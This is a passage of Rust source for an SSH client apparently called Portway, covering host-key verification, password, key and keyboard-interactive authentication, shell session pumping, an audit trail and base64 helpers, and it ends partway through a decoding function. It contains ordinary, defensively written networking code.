use std::collections::HashMap;
use std::path::PathBuf;
use std::sync::{Arc, Mutex};

use russh::client::{self, AuthResult, Handle, KeyboardInteractiveAuthResponse, Prompt};
use russh::keys::{load_secret_key, PrivateKeyWithHashAlg};
use russh::{ChannelMsg, Disconnect, MethodKind, MethodSet};
use serde::Serialize;
use tauri::{AppHandle, Emitter, Manager};
use tokio::sync::mpsc;
use zeroize::Zeroizing;

use crate::audit::{self, Kind, LineReader, Origin};
use crate::db::Db;
use crate::error::{Error, Result};
use crate::keychain;
use crate::hosts;
use crate::logging::{self, Level, Span};
use crate::models::Host;

/// A live SSH connection plus its interactive shell.
///
/// `Handle` is the multiplexed connection: the shell rides one channel and
/// SFTP opens another on the same connection, which is why both appear under
/// one session and one audit trail.
pub struct Session {
    pub id: String,
    pub host_id: i64,
    /// The window that opened this session. Output is emitted only there:
    /// `app.emit` broadcasts to every webview, so with a session in its own
    /// window each byte would cross the IPC boundary once per window and be
    /// discarded by all but one.
    pub window: String,
    pub handle: Handle<ClientHandler>,
    /// Keystrokes go here; a task forwards them to the shell channel.
    pub input: mpsc::UnboundedSender<Vec<u8>>,
    /// Window resize requests, same idea.
    pub resize: mpsc::UnboundedSender<(u32, u32)>,
    pub started_at: i64,
    pub server_key: String,
    /// The host, spelled the way a log line needs it: the name the user gave it
    /// and the address it actually reached.
    ///
    /// Carried on the session rather than looked up per line. Every log line
    /// about this connection has to name the server or it cannot be told from
    /// the other four a person has open — and `session=63151` names nothing a
    /// human recognises. A database read per line, on a path that logs every
    /// keystroke, is not the way to get it.
    pub label: String,
    /// The last directory the shell announced, or `None` if it never has.
    ///
    /// Held on the session rather than in the pump task that fills it, because
    /// the pane that reads it is destroyed and rebuilt every time the user
    /// switches tabs — `SessionScreen` renders only the active one. A pane
    /// coming back has to be able to *ask* what it missed, the way `sshBus`
    /// replays terminal output for the same reason. Without that it would sit
    /// at "the shell has not said" until the user happened to `cd` somewhere
    /// new, because a shell announcing the same directory at every prompt is
    /// deduped and emits nothing.
    pub cwd: Arc<Mutex<Option<String>>>,
}

#[derive(Default)]
pub struct Sessions(pub Mutex<HashMap<String, Arc<Session>>>);

/// What the UI needs to render a session's header and status bar.
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct SessionInfo {
    pub id: String,
    pub host_id: i64,
    pub host_name: String,
    pub user: String,
    /// The key algorithm actually negotiated, e.g. `ssh-ed25519`.
    pub server_key: String,
    pub started_at: i64,
}

/// Payload for the `ssh://data` event — one chunk of shell output.
#[derive(Clone, Serialize)]
#[serde(rename_all = "camelCase")]
struct DataEvent {
    session_id: String,
    /// Base64 so arbitrary bytes survive the JSON hop intact.
    data: String,
}

#[derive(Clone, Serialize)]
#[serde(rename_all = "camelCase")]
struct ClosedEvent {
    session_id: String,
    reason: String,
}

pub struct ClientHandler {
    /// Filled in during the handshake so the session can report what it saw.
    pub server_key: Arc<Mutex<String>>,
    /// What the host-key check decided, for the audit trail. `check_server_key`
    /// has no database access, so the verdict is parked here and written once
    /// the connection is established.
    pub verdict: Arc<Mutex<String>>,
    pub known_hosts: KnownHostsPolicy,
    /// Where to send channels the *server* opens, which is how a remote forward
    /// delivers its traffic: `tcpip_forward` only asks the server to listen, and
    /// every connection it then accepts arrives here rather than on the handle.
    /// `None` for every other kind of connection, which opens its own channels
    /// and is never called back.
    pub forward_to: Option<(String, u16)>,
}

/// What to do about a server key, and which server it is about.
///
/// A changed key is always refused. What Settings decides is the *other*
/// half: whether a host nobody has met before is recorded and trusted, or
/// stopped. Those are OpenSSH's `accept-new` and `yes`, and they are named
/// after it here for the same reason the Known hosts screen shows real
/// fingerprints — this is a file and a protocol somebody may already know.
pub struct KnownHostsPolicy {
    pub host: String,
    pub port: u16,
    /// `false` is `accept-new`: a first sight is trusted and written down, the
    /// way `ssh` does. `true` is `yes`: nothing gets in that is not already in
    /// the file, and a new server has to be added deliberately.
    pub strict: bool,
}

impl client::Handler for ClientHandler {
    type Error = russh::Error;

    async fn check_server_key(
        &mut self,
        key: &russh::keys::ssh_key::PublicKey,
    ) -> std::result::Result<bool, Self::Error> {
        *self.server_key.lock().unwrap() = key.algorithm().to_string();

        let path = known_hosts_path();
        let mut verdict = self.verdict.lock().unwrap();

        // The three outcomes are easy to get backwards, so spelled out:
        //   Ok(true)  — recorded and the key matches
        //   Ok(false) — no entry for this host at all
        //   Err(KeyChanged) — recorded, and the key is DIFFERENT
        match russh::keys::check_known_hosts_path(
            &self.known_hosts.host,
            self.known_hosts.port,
            key,
            &path,
        ) {
            Ok(true) => {
                *verdict = "known host key".into();
                Ok(true)
            }
            // First sight, and Settings says only what is already in the file
            // may in. Nothing is written: recording the key here would defeat
            // the setting by making every host known the moment it is met.
            Ok(false) if self.known_hosts.strict => {
                *verdict = "REFUSED — host key not in known_hosts (strict host keys)".into();
                Ok(false)
            }
            // First sight: trust it and write it down, the way `ssh` does on a
            // first connection.
            Ok(false) => {
                let learned = russh::keys::known_hosts::learn_known_hosts_path(
                    &self.known_hosts.host,
                    self.known_hosts.port,
                    key,
                    &path,
                );
                *verdict = match learned {
                    Ok(()) => "new host key recorded".into(),
                    Err(e) => format!("new host key, but known_hosts could not be written: {e}"),
                };
                Ok(true)
            }
            // The host is known and the key does not match. The design leaves
            // the "host key changed" confirmation undrawn, so there is no way
            // to ask — refusing is the safe half of that missing dialog.
            Err(e) => {
                *verdict = format!("REFUSED — host key changed ({e})");
                Ok(false)
            }
        }
    }

    /// A connection the *server* made on our behalf, on a port a remote forward
    /// asked it to listen on. Ours to join to something local.
    ///
    /// Dropping the channel is the right answer when there is nowhere to send
    /// it: that is a connection to a port this client never asked to forward.
    async fn server_channel_open_forwarded_tcpip(
        &mut self,
        channel: russh::Channel<russh::client::Msg>,
        _connected_address: &str,
        _connected_port: u32,
        _originator_address: &str,
        _originator_port: u32,
        _session: &mut russh::client::Session,
    ) -> std::result::Result<(), Self::Error> {
        let Some((host, port)) = self.forward_to.clone() else { return Ok(()) };

        tokio::spawn(async move {
            let Ok(mut local) = tokio::net::TcpStream::connect((host.as_str(), port)).await else {
                // The far end is already connected and waiting; closing our half
                // is what tells it there is nothing here.
                return;
            };
            let mut remote = channel.into_stream();
            let _ = tokio::io::copy_bidirectional(&mut local, &mut remote).await;
        });

        Ok(())
    }
}

fn known_hosts_path() -> PathBuf {
    dirs::home_dir()
        .unwrap_or_default()
        .join(".ssh")
        .join("known_hosts")
}

pub fn expand_home(path: &str) -> PathBuf {
    if let Some(rest) = path.strip_prefix("~/") {
        return dirs::home_dir().unwrap_or_default().join(rest);
    }
    PathBuf::from(path)
}

/// Reaches a host and authenticates, and stops there.
///
/// Split out of `connect` because a shell is not the only reason to hold a
/// connection: a tunnel wants one with no channel on it at all. Everything up
/// to and including authentication is identical either way — the same host-key
/// policy, the same auth methods, the same audit entries — and the two would
/// drift apart the moment they were written twice.
///
/// Returns the handle and the key algorithm the handshake settled on.
///
/// `forward_to` is where inbound forwarded channels should be connected, and is
/// `None` for everything but a remote forward: the server opens those channels
/// against the *handler*, so the destination has to be decided here, before the
/// connection exists.
pub async fn dial(
    app: &AppHandle,
    host: &Host,
    session_id: Option<&str>,
    forward_to: Option<(String, u16)>,
) -> Result<(Handle<ClientHandler>, String)> {
    let db = app.state::<Db>();
    let addr = format!("{}:{}", host.address, host.port);

    {
        let conn = db.0.lock().unwrap();
        audit::record(
            &conn,
            host.id,
            session_id,
            Origin::System,
            Kind::Auth,
            &format!("connect {}@{}", host.user, addr),
            Some(&format!("auth={}", host.auth)),
            None,
        );
    }

    let config = Arc::new(client::Config {
        inactivity_timeout: Some(std::time::Duration::from_secs(3600)),
        ..Default::default()
    });

    // Read here rather than inside the handler: `check_server_key` runs in the
    // middle of a handshake with no access to the database, and reaching for a
    // mutex from there would tie a network callback to whatever else is
    // holding it.
    let strict = {
        let conn = db.0.lock().unwrap();
        crate::settings::text(&conn, "hostKeys").as_deref() == Some("strict")
    };

    let server_key = Arc::new(Mutex::new(String::new()));
    let verdict = Arc::new(Mutex::new(String::new()));
    let handler = ClientHandler {
        server_key: server_key.clone(),
        verdict: verdict.clone(),
        known_hosts: KnownHostsPolicy {
            host: host.address.clone(),
            port: host.port,
            strict,
        },
        forward_to,
    };

    let handshake = Span::start("ssh", format!("handshake with {addr}"));
    let connected = client::connect(config, (host.address.as_str(), host.port), handler).await;

    // Whatever happened, the host-key decision is worth recording — a refusal
    // is exactly the event an audit trail exists for.
    {
        let decision = verdict.lock().unwrap().clone();
        if !decision.is_empty() {
            let conn = db.0.lock().unwrap();
            audit::record(
                &conn,
                host.id,
                session_id,
                Origin::System,
                Kind::Auth,
                "verify host key",
                Some(&decision),
                None,
            );
            let level = if decision.starts_with("REFUSED") { Level::Error } else { Level::Debug };
            logging::record(level, "ssh", "host key", Some(&decision));
        }
    }

    let mut handle = match connected {
        Ok(handle) => {
            handshake.done(Level::Info, Some(&format!("key={}", server_key.lock().unwrap())));
            handle
        }
        Err(e) => {
            let decision = verdict.lock().unwrap().clone();
            // Two refusals with two different fixes. Telling somebody to
            // remove an entry that is not there is worse than saying nothing.
            let error = if decision.contains("strict host keys") {
                Error::Ssh(format!(
                    "{decision}. Either add this server's key to ~/.ssh/known_hosts, \
                     or set Settings › Security › Host keys back to accept-new."
                ))
            } else if decision.starts_with("REFUSED") {
                Error::Ssh(format!(
                    "{decision}. Check it in Known hosts, and remove the old entry there \
                     if this is expected."
                ))
            } else {
                Error::Ssh(format!("could not reach {addr}: {e}"))
            };
            handshake.failed(&error.to_string());
            return Err(error);
        }
    };

    let auth = Span::start("ssh", format!("authenticate {}@{addr}", host.user));
    match authenticate(&mut handle, host).await {
        Ok(method) => {
            auth.done(Level::Info, Some(&format!("method={method}")));
            // The entry written before the handshake records what the host was
            // *set* to use. This one records what the server actually took, and
            // the two differ every time the keyboard-interactive fallback runs.
            let conn = db.0.lock().unwrap();
            audit::record(
                &conn,
                host.id,
                session_id,
                Origin::System,
                Kind::Auth,
                "authenticated",
                Some(&format!("method={method}")),
                None,
            );
        }
        Err(e) => {
            auth.failed(&e.to_string());
            return Err(e);
        }
    }

    let negotiated = server_key.lock().unwrap().clone();
    Ok((handle, negotiated))
}

/// Opens the connection, authenticates, and starts an interactive shell.
///
/// Every step that touches the host is written to the audit trail as it
/// happens, so a failed connection leaves a record too.
pub async fn connect(
    app: AppHandle,
    host: Host,
    session_id: String,
    window: String,
) -> Result<SessionInfo> {
    let db = app.state::<Db>();

    // The whole thing, end to end. `dial` times the handshake and the
    // authentication inside it, so a slow connection can be read down to which
    // step ate the time.
    let opening = Span::start("ssh", format!("open a session to {}", host.name));
    logging::info(
        "ssh",
        "connecting",
        Some(&format!(
            "host={} address={}@{}:{} auth={} session={session_id} window={window}",
            host.name, host.user, host.address, host.port, host.auth
        )),
    );

    let (handle, negotiated) = match dial(&app, &host, Some(&session_id), None).await {
        Ok(dialled) => dialled,
        Err(e) => {
            opening.failed(&e.to_string());
            return Err(e);
        }
    };

    let mut channel = handle
        .channel_open_session()
        .await
        .map_err(|e| Error::Ssh(format!("could not open a channel: {e}")))?;

    // 80x24 is the design's status bar default; the UI corrects it as soon as
    // xterm.js has measured the pane.
    channel
        .request_pty(false, "xterm-256color", 80, 24, 0, 0, &[])
        .await
        .map_err(|e| Error::Ssh(format!("the server refused a terminal: {e}")))?;
    channel
        .request_shell(true)
        .await
        .map_err(|e| Error::Ssh(format!("the server refused a shell: {e}")))?;

    let (input_tx, mut input_rx) = mpsc::unbounded_channel::<Vec<u8>>();
    let (resize_tx, mut resize_rx) = mpsc::unbounded_channel::<(u32, u32)>();

    let started_at = crate::db::now_ms();

    {
        let conn = db.0.lock().unwrap();
        audit::record(
            &conn,
            host.id,
            Some(&session_id),
            Origin::System,
            Kind::Auth,
            "open shell",
            Some(&format!("pty=xterm-256color hostkey={negotiated}")),
            None,
        );
    }

    // One task owns the channel: it pumps output to the webview and drains the
    // input and resize queues. Sharing a russh channel across tasks is not
    // possible, so everything funnels through here.
    let pump_app = app.clone();
    let pump_session = session_id.clone();
    let pump_window = window.clone();
    let host_id = host.id;
    let run_on_connect = host.run_on_connect.clone();

    // Made here and shared both ways: the task below writes it, the session
    // holds it, and `cwd()` reads it for a pane that has just been rebuilt.
    let cwd = Arc::new(Mutex::new(None::<String>));
    let pump_cwd = Arc::clone(&cwd);

    tauri::async_runtime::spawn(async move {
        let mut reader = LineReader::default();
        // The other direction: keystrokes go through `reader`, and the shell's
        // own output goes through this one.
        let mut cwd_reader = CwdReader::default();

        // `Run on connect` is Portway acting on its own, so it is logged as
        // system before the user has typed anything.
        if let Some(command) = run_on_connect.as_deref().filter(|c| !c.trim().is_empty()) {
            let db = pump_app.state::<Db>();
            {
                let conn = db.0.lock().unwrap();
                audit::record(
                    &conn,
                    host_id,
                    Some(&pump_session),
                    Origin::System,
                    Kind::Shell,
                    command,
                    Some("run on connect"),
                    None,
                );
            }
            let _ = channel.data(format!("{command}\n").as_bytes()).await;
        }

        loop {
            tokio::select! {
                Some(bytes) = input_rx.recv() => {
                    // Reconstruct what the person is typing before it goes out.
                    for line in reader.push(&bytes) {
                        let db = pump_app.state::<Db>();
                        let conn = db.0.lock().unwrap();
                        audit::record(
                            &conn, host_id, Some(&pump_session),
                            Origin::User, Kind::Shell, &line, None, None,
                        );
                    }
                    if channel.data(bytes.as_slice()).await.is_err() {
                        break;
                    }
                }
                Some((cols, rows)) = resize_rx.recv() => {
                    let _ = channel.window_change(cols, rows, 0, 0).await;
                }
                message = channel.wait() => {
                    match message {
                        Some(ChannelMsg::Data { data }) => {
                            // Only here, and not on `ExtendedData` below:
                            // stderr on a PTY channel is unusual, and a folder
                            // the SFTP pane is about to open must not come from
                            // it.
                            if let Some(found) = cwd_reader.push(&data) {
                                // Recorded on every announcement, emitted only
                                // on a change. A shell says where it is before
                                // each prompt, and a pane told the same thing
                                // sixty times a minute would be re-rendering to
                                // say nothing — but a pane rebuilt by a tab
                                // switch still has to be able to ask, which is
                                // what the stored copy is for.
                                let changed = {
                                    let mut held = pump_cwd.lock().unwrap();
                                    let changed = held.as_deref() != Some(found.as_str());
                                    if changed {
                                        *held = Some(found.clone());
                                    }
                                    changed
                                };
                                if changed {
                                    let _ = pump_app.emit_to(&pump_window, "ssh://cwd", CwdEvent {
                                        session_id: pump_session.clone(),
                                        path: found,
                                    });
                                }
                            }
                            let _ = pump_app.emit_to(&pump_window, "ssh://data", DataEvent {
                                session_id: pump_session.clone(),
                                data: base64(&data),
                            });
                        }
                        Some(ChannelMsg::ExtendedData { data, .. }) => {
                            let _ = pump_app.emit_to(&pump_window, "ssh://data", DataEvent {
                                session_id: pump_session.clone(),
                                data: base64(&data),
                            });
                        }
                        Some(ChannelMsg::Eof) | Some(ChannelMsg::Close) | None => break,
                        _ => {}
                    }
                }
            }
        }

        {
            let db = pump_app.state::<Db>();
            let conn = db.0.lock().unwrap();
            audit::record(
                &conn, host_id, Some(&pump_session),
                Origin::System, Kind::Auth, "shell closed", None, None,
            );
        }
        logging::info(
            "ssh",
            "the shell ended",
            Some(&format!("session={pump_session} host={host_id}")),
        );
        let _ = pump_app.emit_to(
            &pump_window,
            "ssh://closed",
            ClosedEvent { session_id: pump_session.clone(), reason: "the shell ended".into() },
        );
        let sessions = pump_app.state::<Sessions>();
        sessions.0.lock().unwrap().remove(&pump_session);
    });

    let session = Arc::new(Session {
        id: session_id.clone(),
        host_id: host.id,
        window: window.clone(),
        handle,
        input: input_tx,
        resize: resize_tx,
        started_at,
        server_key: negotiated.clone(),
        label: format!("{} {}@{}:{}", host.name, host.user, host.address, host.port),
        cwd,
    });

    app.state::<Sessions>()
        .0
        .lock()
        .unwrap()
        .insert(session_id.clone(), session);

    // Connecting counts as using the host.
    let _ = hosts::touch(&db, host.id);

    opening.done(
        Level::Info,
        Some(&format!("session={session_id} hostkey={negotiated}")),
    );

    Ok(SessionInfo {
        id: session_id,
        host_id: host.id,
        host_name: host.name,
        user: host.user,
        server_key: negotiated,
        started_at,
    })
}

/// Authenticates, and answers with the method that actually worked.
///
/// Not the same as the method the host was configured with: a host set to
/// Password may get in by `keyboard-interactive`, and the audit trail should
/// say which of the two happened rather than repeating the form's intent.
async fn authenticate(handle: &mut Handle<ClientHandler>, host: &Host) -> Result<&'static str> {
    match host.auth.as_str() {
        "key" => {
            let path = expand_home(host.key_path.as_deref().unwrap_or("~/.ssh/id_ed25519"));

            // Said before the read rather than after it, because the read is
            // where it goes quiet: macOS draws its consent dialog outside the
            // app, so from in here a gated key looks like a server that has
            // stopped answering. The span below then puts a number on it.
            if logging::is_gated_path(&path) {
                logging::warn(
                    "ssh",
                    "this key is in a folder macOS keeps behind a permission prompt",
                    Some(&format!(
                        "{} — the first read blocks until that dialog is answered, and an \
                         ad-hoc signed build is asked again after every rebuild. ~/.ssh is \
                         not gated.",
                        path.display()
                    )),
                );
            }

            // Reading the credential store can put a system prompt on screen and
            // block for as long as the user looks at it, so it does not run on a
            // runtime worker.
            let passphrase = if host.unlock_via_keychain {
                stored_secret(keychain::Slot::Passphrase, host.id).await?
            } else {
                None
            };

            let read = Span::start("ssh", "read the private key");
            let key = match load_secret_key(&path, passphrase.as_ref().map(|p| p.as_str())) {
                Ok(key) => {
                    read.done(Level::Debug, Some(&path.display().to_string()));
                    key
                }
                Err(e) => {
                    let error = Error::Ssh(format!(
                        "could not read {} — {e}. If the key is encrypted, put its \
                         passphrase in the host's form with \"Unlock via keychain\" on.",
                        path.display()
                    ));
                    read.failed(&error.to_string());
                    return Err(error);
                }
            };
            // Which signature algorithm to sign with, asked of the server rather
            // than assumed. It matters only for RSA keys, and there it is the
            // difference between connecting and not: `None` means `ssh-rsa`,
            // which is RSA over SHA-1, and OpenSSH has refused that by default
            // since 8.8. An RSA key that works everywhere else would be rejected
            // here with nothing to suggest the key was fine all along.
            //
            // The server answers through the `server-sig-algs` extension. A
            // server too old to send one flattens to `None`, which is also the
            // right answer for it. Non-RSA keys ignore this entirely.
            let hash_alg = handle
                .best_supported_rsa_hash()
                .await
                .map_err(|e| {
                    Error::Ssh(format!("could not read the server's signature algorithms: {e}"))
                })?
                .flatten();

            let auth = handle
                .authenticate_publickey(
                    &host.user,
                    PrivateKeyWithHashAlg::new(Arc::new(key), hash_alg),
                )
                .await
                .map_err(|e| Error::Ssh(format!("key auth failed: {e}")))?;
            if !auth.success() {
                // Name the algorithm: "the server rejected the key" alone sends
                // people looking for a wrong key, which is the one thing it is
                // usually not.
                return Err(Error::Ssh(format!(
                    "the server rejected the key for user '{}' (offered {}). \
                     Check that the public half is in ~/.ssh/authorized_keys on the host.",
                    host.user,
                    match hash_alg {
                        Some(alg) => format!("rsa-{alg:?}").to_lowercase(),
                        None => "the key's default algorithm".into(),
                    }
                )));
            }
            Ok("publickey")
        }
        "password" => {
            let Some(password) = stored_secret(keychain::Slot::Password, host.id).await? else {
                return Err(Error::Ssh(format!(
                    "no password is stored for '{}'. Open the host, type it into the Password \
                     box with \"Save to system keychain\" on, and save — the app sends what is \
                     in the keychain, and there is nothing there for this host.",
                    host.name
                )));
            };
            password_auth(handle, host, &password).await
        }
        "agent" => Err(Error::Ssh(
            "ssh-agent auth is not wired up yet — use a private key for now".into(),
        )),
        other => Err(Error::Ssh(format!("unknown auth method '{other}'"))),
    }
}

/// Reads one secret for a host, off the runtime's workers.
///
/// The credential store can put a system prompt on screen and block for as long
/// as the user looks at it, so this never runs on a worker thread.
///
/// `Zeroizing` so the copy this end holds is wiped when the connection attempt
/// ends, whichever way it ended.
async fn stored_secret(slot: keychain::Slot, host_id: i64) -> Result<Option<Zeroizing<String>>> {
    let span = Span::start("ssh", "keychain lookup");
    let found = tokio::task::spawn_blocking(move || keychain::get(slot, host_id))
        .await
        .map_err(|e| Error::Ssh(format!("keychain lookup did not finish: {e}")))??
        .map(Zeroizing::new);
    // Whether there was one, never what it was.
    span.done(
        Level::Debug,
        Some(if found.is_some() { "a secret was stored" } else { "nothing stored" }),
    );
    Ok(found)
}

/// Password auth, in both of the shapes servers offer it.
///
/// `password` is the method's own name; `keyboard-interactive` is the one PAM
/// answers on. Plenty of hosts that offer what an admin would call "password
/// login" accept only the second — `KbdInteractiveAuthentication yes` with
/// `PasswordAuthentication no` is an ordinary sshd configuration, and it is the
/// default on several distributions. Sending only the first would fail there
/// with nothing to suggest the password was right all along.
///
/// The server is asked what it will accept before anything is sent, the way
/// `ssh` does. A method the server never listed is an attempt spent for
/// nothing, and `MaxAuthTries` counts it.
async fn password_auth(
    handle: &mut Handle<ClientHandler>,
    host: &Host,
    password: &str,
) -> Result<&'static str> {
    let offered = match handle.authenticate_none(&host.user).await {
        // A server that admits anyone with no credentials at all. Rare, and
        // never what the form intended, but it has just said the connection is
        // authenticated and there is nothing left to send. Said out loud,
        // because a host that stops asking for a password is worth knowing
        // about — it is either misconfigured or not the host it was.
        Ok(AuthResult::Success) => {
            logging::warn(
                "ssh",
                "the server let this connection in without any credentials",
                Some(&format!("{}@{} — nothing was sent", host.user, host.address)),
            );
            return Ok("none");
        }
        Ok(AuthResult::Failure { remaining_methods, .. }) => remaining_methods,
        Err(e) => return Err(disconnected_or(e, "could not start authentication")),
    };
    logging::debug("ssh", "the server accepts", Some(&method_names(&offered)));

    // Two things are tracked across the attempt rather than one list, because a
    // server names its methods more than once and the lists do not always
    // agree. `named_something` is whether it has ever said anything at all — an
    // empty list is silence, not a refusal, and silence is no reason to skip a
    // method. `mentions_keyboard` is whether keyboard-interactive appeared in
    // *any* of what it said: a server that lists it up front and then answers a
    // refusal with an empty list has not withdrawn it.
    let mut named_something = !offered.is_empty();
    let mut mentions_keyboard = offered.contains(&MethodKind::KeyboardInteractive);
    let mut tried = false;

    if !named_something || offered.contains(&MethodKind::Password) {
        tried = true;
        let span = Span::start("ssh", "password auth");
        match handle.authenticate_password(&host.user, password).await {
            Ok(AuthResult::Success) => {
                span.done(Level::Debug, Some("accepted"));
                return Ok("password");
            }
            Ok(AuthResult::Failure { partial_success: true, .. }) => {
                span.failed("accepted, but the server wants another factor");
                return Err(second_factor(host));
            }
            Ok(AuthResult::Failure { remaining_methods, .. }) => {
                span.failed("the server did not accept it");
                named_something |= !remaining_methods.is_empty();
                mentions_keyboard |= remaining_methods.contains(&MethodKind::KeyboardInteractive);
            }
            Err(e) => return Err(disconnected_or(e, "password auth failed")),
        }
    }

    // Starting a method the server has ruled out spends one of the few tries it
    // allows and gets nowhere, so this runs only where there is a reason to
    // think it will be taken: it was named, or the server named nothing.
    if mentions_keyboard || !named_something {
        return keyboard_interactive(handle, host, password).await;
    }

    Err(if tried {
        rejected(host)
    } else {
        Error::Ssh(format!(
            "this server does not offer password login for user '{}' — it accepts {}. \
             Switch the host to Private key, or enable password auth on the server.",
            host.user,
            method_names(&offered)
        ))
    })
}

/// The `keyboard-interactive` exchange, answered with the stored password.
///
/// The server drives it: any number of rounds, each carrying a set of prompts.
/// A PAM stack commonly spends the first round on a banner with no prompts at
/// all, so rounds are not what is counted — what is tracked is whether the
/// password has already been given. The thing a server asks for right after
/// accepting it is a second factor, and nothing stored here could answer that;
/// guessing would send the password into a prompt asking for a one-time code.
async fn keyboard_interactive(
    handle: &mut Handle<ClientHandler>,
    host: &Host,
    password: &str,
) -> Result<&'static str> {
    let span = Span::start("ssh", "keyboard-interactive auth");
    let mut response = handle
        .authenticate_keyboard_interactive_start(&host.user, None::<String>)
        .await
        .map_err(|e| disconnected_or(e, "keyboard-interactive auth failed"))?;
    let mut sent_password = false;

    // Bounded because the far end decides how many rounds there are: a server
    // sending empty requests forever would otherwise keep this task here.
    for _ in 0..10 {
        let answers = match response {
            KeyboardInteractiveAuthResponse::Success => {
                span.done(Level::Debug, Some("accepted"));
                return Ok("keyboard-interactive");
            }
            KeyboardInteractiveAuthResponse::Failure { partial_success, .. } => {
                span.failed(if partial_success {
                    "accepted, but the server wants another factor"
                } else {
                    "the server did not accept it"
                });
                return Err(if partial_success { second_factor(host) } else { rejected(host) });
            }
            KeyboardInteractiveAuthResponse::InfoRequest { name, instructions, prompts } => {
                // The server's own words, and the one thing that explains a
                // refusal after the fact — "Password expired", "Account locked",
                // a 2FA prompt. Written down; the answers never are. Built once
                // here because the failure below quotes the same line.
                let asked = describe(&name, &instructions, &prompts);
                logging::debug("ssh", "the server asks", Some(&asked));
                match prompts.as_slice() {
                    // A banner, or an instruction with nothing to answer.
                    [] => Vec::new(),
                    // Asked twice for the same thing: the server refused what
                    // was sent and is offering another go. Saying "this needs
                    // an interactive login" here would send somebody hunting
                    // for a second factor that does not exist, when the answer
                    // is that the stored password is wrong.
                    [prompt] if !prompt.echo && !asks_for_a_second_factor(&prompt.prompt) => {
                        if sent_password {
                            span.failed("asked for the password again");
                            return Err(rejected(host));
                        }
                        sent_password = true;
                        vec![password.to_string()]
                    }
                    _ => {
                        span.failed(&asked);
                        return Err(Error::Ssh(format!(
                            "the server is asking for something the app cannot answer from a \
                             stored password ({asked}). A host behind a one-time code or a \
                             second factor needs an interactive login, which Portway does not \
                             have yet — use a private key for this one."
                        )));
                    }
                }
            }
        };
        response = handle
            .authenticate_keyboard_interactive_respond(answers)
            .await
            .map_err(|e| disconnected_or(e, "keyboard-interactive auth failed"))?;
    }

    span.failed("the server kept asking");
    Err(Error::Ssh(format!(
        "the server kept asking for more input than a stored password can answer for user '{}'",
        host.user
    )))
}

/// A connection that ended, said as that rather than as an auth failure.
///
/// russh reports a closed session as `SendError`/`RecvError` from whatever call
/// happened to be in flight, and it also answers a *probe* on a dead connection
/// with `Failure { remaining_methods: <empty> }` rather than an error — so a
/// server that hangs up mid-handshake arrives here looking like a refusal.
/// Blaming the password for a connection that is no longer there sends somebody
/// retyping a password that was never sent.
fn disconnected_or(error: russh::Error, context: &str) -> Error {
    Error::Ssh(match error {
        russh::Error::SendError | russh::Error::RecvError => format!(
            "the server closed the connection during authentication. \
             Nothing was rejected — check the host is reachable and try again ({context})."
        ),
        other => format!("{context}: {other}"),
    })
}

/// Named separately from a plain rejection: the password was *right*, and
/// telling somebody to check it would send them retyping a correct one.
fn second_factor(host: &Host) -> Error {
    Error::Ssh(format!(
        "the password for '{}' was accepted, but the server requires a second factor as well. \
         Portway cannot prompt for one yet — use a private key for this host.",
        host.user
    ))
}

fn rejected(host: &Host) -> Error {
    Error::Ssh(format!(
        "the server rejected the password for user '{}'. Check the password saved for this \
         host, and that the account is not locked or restricted to key auth.",
        host.user
    ))
}

/// `publickey, password` rather than the `Debug` of a set, because this reaches
/// the user in an error and those are the names sshd's own config uses.
fn method_names(methods: &MethodSet) -> String {
    if methods.is_empty() {
        return "nothing it would name".into();
    }
    methods.iter().map(<&str>::from).collect::<Vec<_>>().join(", ")
}

/// Whether a prompt is asking for a second factor rather than a password.
///
/// The distinction decides where the stored password goes. A PAM stack that
/// runs its one-time-code module before `pam_unix` opens with "Verification
/// code:", and answering that with the account password spends the password on
/// a question it cannot satisfy — sending it to the server as the answer to a
/// different prompt, and burning an attempt to do it.
///
/// This names the second factor rather than trying to recognise a password
/// prompt, on purpose: "Password:" is translated on plenty of hosts, and a test
/// for the English word would refuse a login that works today. The words below
/// are the ones the modules print, and a prompt this does not recognise is
/// answered as before.
fn asks_for_a_second_factor(prompt: &str) -> bool {
    let prompt = prompt.to_lowercase();
    [
        "verification", "one-time", "one time", "otp", "token", "authenticator", "2fa",
        "second factor", "duo", "yubikey", "passcode",
    ]
    .iter()
    .any(|needle| prompt.contains(needle))
}

/// Server-supplied text, flattened to one line for a log or an error. Prompts
/// are named but never their answers, and `echo` is noted because it is the
/// difference between "type your password" and "type the code from your phone".
///
/// Clipped, because this is the far end's text and it ends up in an error the
/// form renders: `instructions` may be a whole screenful of banner, and there
/// is nothing to stop a server from sending one.
fn describe(name: &str, instructions: &str, prompts: &[Prompt]) -> String {
    const MAX: usize = 300;

    let mut parts: Vec<String> = Vec::new();
    for text in [name, instructions] {
        let text = text.trim();
        if !text.is_empty() {
            parts.push(text.replace('\n', " "));
        }
    }
    for prompt in prompts {
        let text = prompt.prompt.trim().replace('\n', " ");
        parts.push(if prompt.echo { format!("{text} [visible]") } else { text });
    }
    if parts.is_empty() {
        return "nothing at all".into();
    }

    let line = parts.join(" · ");
    if line.chars().count() <= MAX {
        return line;
    }
    // On a character boundary: a banner can hold anything, and half a UTF-8
    // sequence in a log file is worse than a shorter line.
    line.chars().take(MAX).collect::<String>() + "…"
}

/// Base64 without pulling in a crate for it.
fn base64(bytes: &[u8]) -> String {
    const TABLE: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity(bytes.len().div_ceil(3) * 4);

    for chunk in bytes.chunks(3) {
        let b = [chunk[0], *chunk.get(1).unwrap_or(&0), *chunk.get(2).unwrap_or(&0)];
        let n = ((b[0] as u32) << 16) | ((b[1] as u32) << 8) | b[2] as u32;
        out.push(TABLE[(n >> 18) as usize & 63] as char);
        out.push(TABLE[(n >> 12) as usize & 63] as char);
        out.push(if chunk.len() > 1 { TABLE[(n >> 6) as usize & 63] as char } else { '=' });
        out.push(if chunk.len() > 2 { TABLE[n as usize & 63] as char } else { '=' });
    }
    out
}

pub fn decode_base64(text: &str) -> Vec<u8> {
    let mut out = Vec::with_capacity(text.len() / 4 * 3);
    let mut buffer = 0u32;
    let mut bits = 0u32;

    for byte in text.bytes() {
        let value = match byte {
            b'A'..=b'Z' => byte - b'A',
            b'a'..=b'z' => byte - b'a' + 26,
            b'0'..=b'9' => byte - b'0' + 52,
            b'+' => 62,
            b'/' => 63,
            _ => continue,
        } as u32;
        buffer = (buffer << 6) | value;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((buffer >> bits) as u8);
